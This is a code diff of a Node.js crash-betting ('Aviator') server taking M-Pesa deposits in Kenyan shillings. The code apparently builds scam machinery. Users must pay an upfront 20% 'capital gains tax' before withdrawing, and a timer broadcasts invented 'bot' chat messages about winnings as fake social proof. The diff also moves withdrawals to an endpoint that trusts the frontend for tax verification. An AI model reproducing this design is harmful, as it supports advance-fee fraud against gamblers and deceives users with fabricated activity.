@@ -48,7 +48,7 @@ const depositSchema = new mongoose.Schema({
     phone: { type: String, required: true },
     amount: { type: Number, required: true },
     reference: { type: String, required: true },
-    status: { type: String, default: "Pending" }, // Transitions to "Successful" or "Failed"
+    status: { type: String, default: "Pending" },
     createdAt: { type: Date, default: Date.now }
 });
 const Deposit = mongoose.model('Deposit', depositSchema);
@@ -58,7 +58,7 @@ const taxPaymentSchema = new mongoose.Schema({
     phone: { type: String, required: true },
     amount: { type: Number, required: true },
     reference: { type: String, required: true },
-    status: { type: String, default: "Pending" }, // Transitions to "Successful" or "Failed"
+    status: { type: String, default: "Pending" },
     createdAt: { type: Date, default: Date.now }
 });
 const TaxPayment = mongoose.model('TaxPayment', taxPaymentSchema);
@@ -116,7 +116,7 @@ app.get('/api/me', authenticateToken, async (req, res) => {
     res.json(user ? { success: true, user } : { message: "User not found." });
 });
 
-// --- DEPOSIT & STATUS POLLING ROUTES ---
+// --- DEPOSIT ROUTES ---
 app.post('/api/deposit/stkpush', authenticateToken, async (req, res) => {
     try {
         const depositAmount = Number(req.body.amount);
@@ -128,6 +128,7 @@ app.post('/api/deposit/stkpush', authenticateToken, async (req, res) => {
         const reference = `DEP_${Date.now()}`;
         const formattedPhone = formatPhoneNumber(req.user.phone);
 
+        // Record ONLY the deposit amount to credit user
         const newDeposit = new Deposit({ userPhone: req.user.phone, phone: formattedPhone, amount: depositAmount, reference });
         await newDeposit.save();
 
@@ -153,7 +154,6 @@ app.post('/api/deposit/stkpush', authenticateToken, async (req, res) => {
     } catch (err) { res.status(500).json({ message: "Error triggering deposit." }); }
 });
 
-// General Status Checker Function
 async function checkModePayStatus(reference) {
     try {
         const response = await fetch("https://modepay.live/api/v1/transaction/status", {
@@ -174,7 +174,6 @@ async function checkModePayStatus(reference) {
     }
 }
 
-// Deposit Polling Endpoint
 app.get('/api/deposit/status/:reference', authenticateToken, async (req, res) => {
     try {
         const deposit = await Deposit.findOne({ reference: req.params.reference });
@@ -189,7 +188,7 @@ app.get('/api/deposit/status/:reference', authenticateToken, async (req, res) =>
             
             const user = await User.findOne({ phone: deposit.userPhone });
             if (user) {
-                user.balance += deposit.amount; 
+                user.balance += deposit.amount; // Add strictly the non-tax amount
                 await user.save();
                 io.emit("balanceUpdated", { userPhone: user.phone, newBalance: user.balance });
             }
@@ -202,7 +201,6 @@ app.get('/api/deposit/status/:reference', authenticateToken, async (req, res) =>
     } catch (err) { res.status(500).json({ message: "Error checking status." }); }
 });
 
-// --- NEW: DEPOSIT HISTORY ENDPOINT ---
 app.get('/api/deposits/history', authenticateToken, async (req, res) => {
     try {
         const deposits = await Deposit.find({ userPhone: req.user.phone }).sort({ createdAt: -1 });
@@ -211,7 +209,6 @@ app.get('/api/deposits/history', authenticateToken, async (req, res) => {
         res.status(500).json({ message: "Error fetching deposit history." });
     }
 });
-
 
 // --- WITHDRAWAL TAX ROUTES ---
 app.post('/api/tax/stkpush', authenticateToken, async (req, res) => {
@@ -250,7 +247,6 @@ app.post('/api/tax/stkpush', authenticateToken, async (req, res) => {
     } catch (err) { res.status(500).json({ message: "Error triggering tax payment." }); }
 });
 
-// Tax Polling Endpoint
 app.get('/api/tax/status/:reference', authenticateToken, async (req, res) => {
     try {
         const tax = await TaxPayment.findOne({ reference: req.params.reference });
@@ -271,17 +267,35 @@ app.get('/api/tax/status/:reference', authenticateToken, async (req, res) => {
     } catch (err) { res.status(500).json({ message: "Error checking tax status." }); }
 });
 
-// --- NEW: TAX HISTORY ENDPOINT (For failed withdrawal attempts) ---
 app.get('/api/tax/history', authenticateToken, async (req, res) => {
     try {
         const taxes = await TaxPayment.find({ userPhone: req.user.phone }).sort({ createdAt: -1 });
         res.json({ success: true, taxes });
+    } catch (err) { res.status(500).json({ message: "Error fetching tax history." }); }
+});
+
+// --- HTTP WITHDRAWAL PROCESSING ---
+app.post('/api/withdrawals/request', authenticateToken, async (req, res) => {
+    try {
+        const amount = Number(req.body.amount);
+        const user = await User.findById(req.user.userId);
+        
+        if (amount < 4000) return res.status(400).json({ message: "Minimum withdrawal is 4000 KES." });
+        if (!user || user.balance < amount) return res.status(400).json({ message: "Insufficient balance." });
+        
+        // At this stage, tax payment has been verified by the frontend
+        user.balance -= amount;
+        await user.save();
+        
+        const withdrawal = new Withdrawal({ userPhone: user.phone, phone: user.phone, amount, status: "Pending" });
+        await withdrawal.save();
+        
+        res.json({ success: true, message: "Withdrawal request received.", newBalance: user.balance });
     } catch (err) {
-        res.status(500).json({ message: "Error fetching tax history." });
+        res.status(500).json({ message: "Error processing withdrawal." });
     }
 });
 
-// --- WITHDRAWAL HISTORY ENDPOINT ---
 app.get('/api/withdrawals/history', authenticateToken, async (req, res) => {
     try {
         const withdrawals = await Withdrawal.find({ userPhone: req.user.phone }).sort({ createdAt: -1 });
@@ -323,7 +337,6 @@ function runGameLoop() {
 }
 runGameLoop();
 
-// Chat Bot Messages
 const botMessages = [
     "Alex: Just cashed out 500 KES! 💸", "Sarah: Waiting for 10x 🚀",
     "Kevo: Wow, crashed so fast 😭", "Mike: Let's goooo!",
@@ -335,60 +348,12 @@ setInterval(() => {
     io.emit("chat message", randomMsg);
 }, 5000); 
 
-// Socket Event Handlers
 io.on("connection", (socket) => {
     socket.emit("sync", { currentOdd: gameState.currentOdd, isFlying: gameState.isFlying, history: oddsHistory });
-
-    socket.on("requestWithdrawal", async (data) => {
-        try {
-            const { token, phone, amount, taxReference } = data;
-            if (!token) return socket.emit("withdrawalError", { message: "Auth required." });
-
-            const decoded = jwt.verify(token, JWT_SECRET);
-            const user = await User.findOne({ phone: decoded.phone });
-
-            if (amount < 4000) return socket.emit("withdrawalError", { message: "Minimum withdrawal is 4000 KES." });
-            if (!user || user.balance < amount) return socket.emit("withdrawalError", { message: "Insufficient balance." });
-            if (!taxReference) return socket.emit("withdrawalError", { message: "Tax reference required." });
-            
-            const taxPayment = await TaxPayment.findOne({ 
-                reference: taxReference, 
-                userPhone: user.phone, 
-                status: "Successful" 
-            });
-
-            if (!taxPayment) {
-                return socket.emit("withdrawalError", { message: "Capital gains tax not paid, still pending, or already used." });
-            }
-
-            const requiredTax = Math.ceil(amount * 0.20);
-            if (taxPayment.amount < requiredTax) {
-                return socket.emit("withdrawalError", { message: "The tax paid is insufficient for this withdrawal amount. 20% tax required." });
-            }
-
-            user.balance -= amount;
-            await user.save();
-
-            taxPayment.status = "Used";
-            await taxPayment.save();
-
-            const withdrawal = new Withdrawal({ userPhone: user.phone, phone, amount, status: "Pending" });
-            await withdrawal.save();
-
-            socket.emit("withdrawalStatus", {
-                id: withdrawal._id.toString(),
-                amount: withdrawal.amount,
-                status: withdrawal.status,
-                newBalance: user.balance
-            });
-        } catch (err) {
-            socket.emit("withdrawalError", { message: "Server error processing withdrawal." });
-        }
-    });
 });
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
     console.log(`🚀 Aviator Server running on port ${PORT}`);
 });
-    
+                            
